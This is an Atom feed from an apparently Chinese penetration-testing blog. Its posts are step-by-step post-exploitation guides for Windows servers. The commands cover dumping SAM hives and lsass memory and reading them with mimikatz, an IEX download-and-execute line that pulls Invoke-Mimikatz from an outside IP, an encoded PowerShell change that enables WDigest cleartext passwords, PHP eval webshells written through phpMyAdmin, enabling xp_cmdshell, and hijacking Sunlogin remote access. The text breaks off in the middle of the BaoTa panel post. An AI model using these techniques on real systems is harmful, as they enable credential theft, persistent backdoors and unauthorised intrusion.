<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hzktester`s Blog</title>
  
  
  <link href="https://hzktester.top/atom.xml" rel="self"/>
  
  <link href="https://hzktester.top/"/>
  <updated>2020-11-25T09:28:24.448Z</updated>
  <id>https://hzktester.top/</id>
  
  <author>
    <name>hzktester</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内存中获取管理员明文密码</title>
    <link href="https://hzktester.top/posts/a8076874.html"/>
    <id>https://hzktester.top/posts/a8076874.html</id>
    <published>2020-11-25T13:38:00.000Z</published>
    <updated>2020-11-25T09:28:24.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内存中获取管理员明文密码"><a href="#内存中获取管理员明文密码" class="headerlink" title="内存中获取管理员明文密码"></a>内存中获取管理员明文密码</h1><h2 id="注册表导出hash解密"><a href="#注册表导出hash解密" class="headerlink" title="注册表导出hash解密"></a>注册表导出hash解密</h2><p>导出<code>sam.hiv</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam C:\wwwroot\sam.hiv</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112533.png" alt="image.png"><br>导出<code>sys.hiv</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\wwwroot\sys.hiv</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112534.png" alt="image.png"><br>下载这两个文件，放到<code>mimikatz</code>目录中：<br><img src="https://qiniu.hzktester.top/tp2020112535.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112536.png" alt="image.png"><br>双击启动<code>mimikatz.exe</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">log</span>//生成日志文件</span><br><span class="line">lsadump::sam /sam:Sam.hiv /system:Sys.hiv//抓取密码</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112537.png" alt="image.png"><br>使用以下解码平台解密<code>NTLM</code>：</p><ul><li><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li><li><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></li></ul><p>由于我的密码是强密码，所有没有解密出来：<br><img src="https://qiniu.hzktester.top/tp2020112538.png" alt="image.png"><br>我用自己密码加密。可以看出，结果是正确的</p><h2 id="内存中获取明文"><a href="#内存中获取明文" class="headerlink" title="内存中获取明文"></a>内存中获取明文</h2><p>需要满足两个条件：</p><ul><li>用户登录过该系统</li><li>登陆后未被重启过<h3 id="可以从内存中获取明文密码："><a href="#可以从内存中获取明文密码：" class="headerlink" title="可以从内存中获取明文密码："></a>可以从内存中获取明文密码：</h3>使用命令<code>ver</code>查看版本：版本低于<code>6.3</code>的可以从内存中获取明文密码：<br><img src="https://qiniu.hzktester.top/tp2020112539.png" alt="image.png"><h4 id="procdump获取内存文件"><a href="#procdump获取内存文件" class="headerlink" title="procdump获取内存文件"></a>procdump获取内存文件</h4>上传<code>procdump</code>文件到目标服务器：<br>执行命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/wwwroot/procdumpx64.exe  -accepteula -ma lsass.exe C:/wwwroot/lsass.dmp</span><br></pre></td></tr></table></figure><img src="https://qiniu.hzktester.top/tp2020112540.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112541.png" alt="image.png"><br>下载<code>lsass.dmp</code>到<code>mimikatz</code>目录中：<br><img src="https://qiniu.hzktester.top/tp2020112542.png" alt="image.png"><br>执行以下命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">log</span></span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>然后查看日志文件<code>mimikatz.log</code>：<br><img src="https://qiniu.hzktester.top/tp2020112543.png" alt="image.png"><br>可以看到已经拿到了明文密码<h4 id="任务管理器导出内存文件"><a href="#任务管理器导出内存文件" class="headerlink" title="任务管理器导出内存文件"></a>任务管理器导出内存文件</h4>从任务管理器中找到<code>lsass.exe</code>进程：</li></ul><p>右键-创建转储文件<br><img src="https://qiniu.hzktester.top/tp2020112544.png" alt="image.png"><br>拿到<code>lsass.DMP</code>文件后还是使用<code>mimiktz</code>的命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">log</span></span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h4 id="Powershell-mimikatz"><a href="#Powershell-mimikatz" class="headerlink" title="Powershell+mimikatz"></a>Powershell+mimikatz</h4><p>上传<code>Invoke-Mimikatz.ps1</code>到目标服务器<br><img src="https://qiniu.hzktester.top/tp2020112545.png" alt="image.png"><br>使用以下命令直接获取明文密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://139.155.236.39/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112546.png" alt="image.png"><br>明文密码在这儿：<br><img src="https://qiniu.hzktester.top/tp2020112547.png" alt="image.png"></p><h4 id="Mimikatz直接读取"><a href="#Mimikatz直接读取" class="headerlink" title="Mimikatz直接读取"></a>Mimikatz直接读取</h4><p>上传<code>mimikatz_x64</code>文件到目标服务器上：<br><img src="https://qiniu.hzktester.top/tp2020112548.png" alt="image.png"><br>直接运行即可得到明文密码：<br><img src="https://qiniu.hzktester.top/tp2020112549.png" alt="image.png"></p><h3 id="无法从内存中获取明文密码"><a href="#无法从内存中获取明文密码" class="headerlink" title="无法从内存中获取明文密码"></a>无法从内存中获取明文密码</h3><h4 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h4><p>执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell -ENC dAByAHkAIAB7ACAATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAtAE4AYQBtAGUAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0AVgBhAGwAdQBlACAAMQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAH0AYwBhAHQAYwBoACAAewAgAH0A</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112550.png" alt="image.png"><br>重启服务器后使用以上操作就可以在内存中获取明文密码了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;内存中获取管理员明文密码&quot;&gt;&lt;a href=&quot;#内存中获取管理员明文密码&quot; class=&quot;headerlink&quot; title=&quot;内存中获取管理员明文密码&quot;&gt;&lt;/a&gt;内存中获取管理员明文密码&lt;/h1&gt;&lt;h2 id=&quot;注册表导出hash解密&quot;&gt;&lt;a href=&quot;#注册表导出hash解密&quot; class=&quot;headerlink&quot; title=&quot;注册表导出hash解密&quot;&gt;&lt;/a&gt;注册表导出hash解密&lt;/h2&gt;&lt;p&gt;导出&lt;code&gt;sam.hiv&lt;/code&gt;文件：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;reg save hklm\sam C:\wwwroot\sam.hiv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112533.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;导出&lt;code&gt;sys.hiv&lt;/code&gt;文件：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;reg save hklm\system C:\wwwroot\sys.hiv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112534.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;下载这两个文件，放到&lt;code&gt;mimikatz&lt;/code&gt;目录中：&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112535.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112536.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;双击启动&lt;code&gt;mimikatz.exe&lt;/code&gt;文件：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;		//生成日志文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lsadump::sam /sam:Sam.hiv /system:Sys.hiv	//抓取密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112537.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;使用以下解码平台解密&lt;code&gt;NTLM&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cmd5.com/&quot;&gt;https://www.cmd5.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.objectif-securite.ch/ophcrack&quot;&gt;https://www.objectif-securite.ch/ophcrack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://hzktester.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="https://hzktester.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>getshell后启动远程连接</title>
    <link href="https://hzktester.top/posts/5413ca70.html"/>
    <id>https://hzktester.top/posts/5413ca70.html</id>
    <published>2020-11-24T13:38:00.000Z</published>
    <updated>2020-11-25T09:28:24.443Z</updated>
    
    <content type="html"><![CDATA[<h1 id="getshell后启动远程连接"><a href="#getshell后启动远程连接" class="headerlink" title="getshell后启动远程连接"></a>getshell后启动远程连接</h1><h1 id="查询服务器远程连接："><a href="#查询服务器远程连接：" class="headerlink" title="查询服务器远程连接："></a>查询服务器远程连接：</h1><h2 id="进程查询："><a href="#进程查询：" class="headerlink" title="进程查询："></a>进程查询：</h2><p>查询进程服务名称为<code>TermService</code>的进行<code>PID</code>号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112529.png" alt="image.png"><br>查询<code>PID</code>号对应开启的端口号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | find <span class="string">&quot;1744&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112530.png" alt="image.png"></p><h2 id="注册表查询："><a href="#注册表查询：" class="headerlink" title="注册表查询："></a>注册表查询：</h2><p>通过以下命令查询注册表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v <span class="string">&quot;PortNumber&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112531.png" alt="image.png"><br>使用系统计算器解码：<br><img src="https://qiniu.hzktester.top/tp2020112532.png" alt="image.png"></p><h2 id="服务器未开始远程连接："><a href="#服务器未开始远程连接：" class="headerlink" title="服务器未开始远程连接："></a>服务器未开始远程连接：</h2><p>开启远程连接命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p>关闭远程连接命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;getshell后启动远程连接&quot;&gt;&lt;a href=&quot;#getshell后启动远程连接&quot; class=&quot;headerlink&quot; title=&quot;getshell后启动远程连接&quot;&gt;&lt;/a&gt;getshell后启动远程连接&lt;/h1&gt;&lt;h1 id=&quot;查询服务器远程连接：&quot;&gt;&lt;a href=&quot;#查询服务器远程连接：&quot; class=&quot;headerlink&quot; title=&quot;查询服务器远程连接：&quot;&gt;&lt;/a&gt;查询服务器远程连接：&lt;/h1&gt;&lt;h2 id=&quot;进程查询：&quot;&gt;&lt;a href=&quot;#进程查询：&quot; class=&quot;headerlink&quot; title=&quot;进程查询：&quot;&gt;&lt;/a&gt;进程查询：&lt;/h2&gt;&lt;p&gt;查询进程服务名称为&lt;code&gt;TermService&lt;/code&gt;的进行&lt;code&gt;PID&lt;/code&gt;号：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tasklist /svc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112529.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;查询&lt;code&gt;PID&lt;/code&gt;号对应开启的端口号：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -ano | find &lt;span class=&quot;string&quot;&gt;&amp;quot;1744&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112530.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;注册表查询：&quot;&gt;&lt;a href=&quot;#注册表查询：&quot; class=&quot;headerlink&quot; title=&quot;注册表查询：&quot;&gt;&lt;/a&gt;注册表查询：&lt;/h2&gt;&lt;p&gt;通过以下命令查询注册表：&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://hzktester.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="https://hzktester.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin，sqlserver，向日葵提权.md</title>
    <link href="https://hzktester.top/posts/89382ca7.html"/>
    <id>https://hzktester.top/posts/89382ca7.html</id>
    <published>2020-11-23T13:38:00.000Z</published>
    <updated>2020-11-25T09:45:07.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpmyadmin提权"><a href="#phpmyadmin提权" class="headerlink" title="phpmyadmin提权"></a>phpmyadmin提权</h1><h2 id="SQL语句写getshell"><a href="#SQL语句写getshell" class="headerlink" title="SQL语句写getshell"></a>SQL语句写getshell</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>已知<code>web</code>应用绝对路径。</li><li><code>mysql</code>配置文件中<code>secure_file_priv</code>的值为空。</li></ul><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>设置<code>secure_file_priv</code>的值为空：<br><img src="https://qiniu.hzktester.top/tp2020112515.png" alt="image"><br>重启配置生效：<br><img src="https://qiniu.hzktester.top/tp2020112516.png" alt="image"></p><h4 id="查看是否具有写入权限："><a href="#查看是否具有写入权限：" class="headerlink" title="查看是否具有写入权限："></a>查看是否具有写入权限：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112517.png" alt="image"></p><ul><li><code>secure_file_priv</code>为<code>null</code>表示不允许导入导出；</li><li><code>secure_file_priv</code>指定文件夹时，表示mysql的导入导出只能在指定的文件夹；</li><li><code>secure_file_priv</code>没有设置时，则表示没有任何限制；</li></ul><h4 id="查web绝对路径"><a href="#查web绝对路径" class="headerlink" title="查web绝对路径"></a>查<code>web</code>绝对路径</h4><ul><li>利用mysql的特性<code>select @@basedir</code><br><img src="https://qiniu.hzktester.top/tp2020112518.png" alt="image"><br>这里很明显是用了宝塔集成环境，那么默认路径是<code>C:/wwwroot</code></li><li><code>phpinfo</code>信息泄露<br><img src="https://qiniu.hzktester.top/tp2020112519.png" alt="image"></li><li>通过报错</li></ul><h4 id="写入一句话木马："><a href="#写入一句话木马：" class="headerlink" title="写入一句话木马："></a>写入一句话木马：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span><span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">&#x27;C://wwwroot//shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112520.png" alt="image"><br>使用蚁剑连接<br><img src="https://qiniu.hzktester.top/tp2020112521.png" alt="image"></p><h2 id="日志变量getshell"><a href="#日志变量getshell" class="headerlink" title="日志变量getshell"></a>日志变量getshell</h2><ol><li>开启日志保存并修改保存位置<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">&#x27;C://wwwroot//shell2.php&#x27;</span>; </span><br></pre></td></tr></table></figure></li><li>我们在<code>SQL</code>查询的框中写入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure></li><li>蚁剑连接<br><img src="https://qiniu.hzktester.top/tp2020112522.png" alt="image"></li></ol><h1 id="SQL-server提权"><a href="#SQL-server提权" class="headerlink" title="SQL server提权"></a>SQL server提权</h1><p>开启<code>xp_cmdshell</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">&#x27;,1</span></span><br><span class="line"><span class="string">reconfigure</span></span><br><span class="line"><span class="string">go</span></span><br><span class="line"><span class="string">sp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;,1</span></span><br><span class="line"><span class="string">reconfigure</span></span><br><span class="line"><span class="string">go</span></span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112523.png" alt="image"><br>执行系统命令：<br><img src="https://qiniu.hzktester.top/tp2020112524.png" alt="image"></p><h1 id="向日葵远程连接提权："><a href="#向日葵远程连接提权：" class="headerlink" title="向日葵远程连接提权："></a>向日葵远程连接提权：</h1><p>如果目标机器安装了向日葵：<br>默认位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Program Files/Oray/SunLogin/SunloginClient</span><br></pre></td></tr></table></figure><p>我们在自己电脑上同样安装一个向日葵，修改自己的配置文件改为他的配置文件：<br><img src="https://qiniu.hzktester.top/tp2020112525.png" alt="image"><br>这时，连接密码就一样了：<br><img src="https://qiniu.hzktester.top/tp2020112526.png" alt="image"><br>识别码在这里：<br><img src="https://qiniu.hzktester.top/tp2020112527.png" alt="image"><br>然后就远程连接了他的电脑：<br><img src="https://qiniu.hzktester.top/tp2020112528.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;phpmyadmin提权&quot;&gt;&lt;a href=&quot;#phpmyadmin提权&quot; class=&quot;headerlink&quot; title=&quot;phpmyadmin提权&quot;&gt;&lt;/a&gt;phpmyadmin提权&lt;/h1&gt;&lt;h2 id=&quot;SQL语句写getshell&quot;&gt;&lt;a href=&quot;#SQL语句写getshell&quot; class=&quot;headerlink&quot; title=&quot;SQL语句写getshell&quot;&gt;&lt;/a&gt;SQL语句写getshell&lt;/h2&gt;&lt;h3 id=&quot;前提条件&quot;&gt;&lt;a href=&quot;#前提条件&quot; class=&quot;headerlink&quot; title=&quot;前提条件&quot;&gt;&lt;/a&gt;前提条件&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;已知&lt;code&gt;web&lt;/code&gt;应用绝对路径。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mysql&lt;/code&gt;配置文件中&lt;code&gt;secure_file_priv&lt;/code&gt;的值为空。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;复现步骤&quot;&gt;&lt;a href=&quot;#复现步骤&quot; class=&quot;headerlink&quot; title=&quot;复现步骤&quot;&gt;&lt;/a&gt;复现步骤&lt;/h3&gt;&lt;p&gt;设置&lt;code&gt;secure_file_priv&lt;/code&gt;的值为空：&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112515.png&quot; alt=&quot;image&quot;&gt;&lt;br&gt;重启配置生效：&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112516.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;查看是否具有写入权限：&quot;&gt;&lt;a href=&quot;#查看是否具有写入权限：&quot; class=&quot;headerlink&quot; title=&quot;查看是否具有写入权限：&quot;&gt;&lt;/a&gt;查看是否具有写入权限：&lt;/h4&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;variables&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;%secure%&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112517.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;为&lt;code&gt;null&lt;/code&gt;表示不允许导入导出；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;指定文件夹时，表示mysql的导入导出只能在指定的文件夹；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;没有设置时，则表示没有任何限制；&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://hzktester.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="https://hzktester.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>中间件降权，宝塔偷梁换柱提权</title>
    <link href="https://hzktester.top/posts/7ab30567.html"/>
    <id>https://hzktester.top/posts/7ab30567.html</id>
    <published>2020-11-22T13:38:00.000Z</published>
    <updated>2020-11-25T09:28:24.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="windwos用户-用户组"><a href="#windwos用户-用户组" class="headerlink" title="windwos用户/用户组"></a>windwos用户/用户组</h1><h2 id="net-user：用户操作"><a href="#net-user：用户操作" class="headerlink" title="net user：用户操作"></a>net user：用户操作</h2><p>以下以操作用户名<code>test</code>为例</p><ul><li><code>net user test 密码 /add</code>：添加用户</li><li><code>net user test 密码</code>：修改用户名密码</li><li><code>net user test</code>：查看<code>test</code>用户详情</li><li><code>net user test /active:yes</code>：激活<code>test</code>用户</li><li><code>net user test /active:no</code>：禁用<code>test</code>用户</li></ul><h2 id="net-localgroup：用户组操作"><a href="#net-localgroup：用户组操作" class="headerlink" title="net localgroup：用户组操作"></a>net localgroup：用户组操作</h2><ul><li><code>net localgroup Administrators</code>：查询<code>Administrators</code>用户组成员</li><li><code>net localgroup Administrators test /add</code>：添加<code>test</code>到<code>Administrators</code>用户组</li><li><code>net localgroup Administrators test /del</code>：从<code>Administrators</code>用户组删除<code>test</code></li></ul><h1 id="默认可写目录"><a href="#默认可写目录" class="headerlink" title="默认可写目录"></a>默认可写目录</h1><ul><li>windows：<code>C:/Windows/Temp</code></li><li>linux：<code>/tmp</code></li></ul><h1 id="宝塔中间件降权"><a href="#宝塔中间件降权" class="headerlink" title="宝塔中间件降权"></a>宝塔中间件降权</h1><h2 id="Apache使用www用户运行"><a href="#Apache使用www用户运行" class="headerlink" title="Apache使用www用户运行"></a>Apache使用www用户运行</h2><p><img src="https://qiniu.hzktester.top/tp2020112501.png" alt="image.png"></p><h2 id="Mysql使用mysql用户运行"><a href="#Mysql使用mysql用户运行" class="headerlink" title="Mysql使用mysql用户运行"></a>Mysql使用mysql用户运行</h2><p><img src="https://qiniu.hzktester.top/tp2020112502.png" alt="image.png"></p><h1 id="getshell之后登录宝塔"><a href="#getshell之后登录宝塔" class="headerlink" title="getshell之后登录宝塔"></a>getshell之后登录宝塔</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>需要管理员权限<br><img src="https://qiniu.hzktester.top/tp2020112503.png" alt="image.png"></p><h2 id="查看宝塔面板登录入口"><a href="#查看宝塔面板登录入口" class="headerlink" title="查看宝塔面板登录入口"></a>查看宝塔面板登录入口</h2><p>默认存储位置：<code>C:/BtSoft/panel/data/admin_path.pl</code><br><img src="https://qiniu.hzktester.top/tp2020112504.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112505.png" alt="image.png"></p><h2 id="下载查看宝塔数据库文件"><a 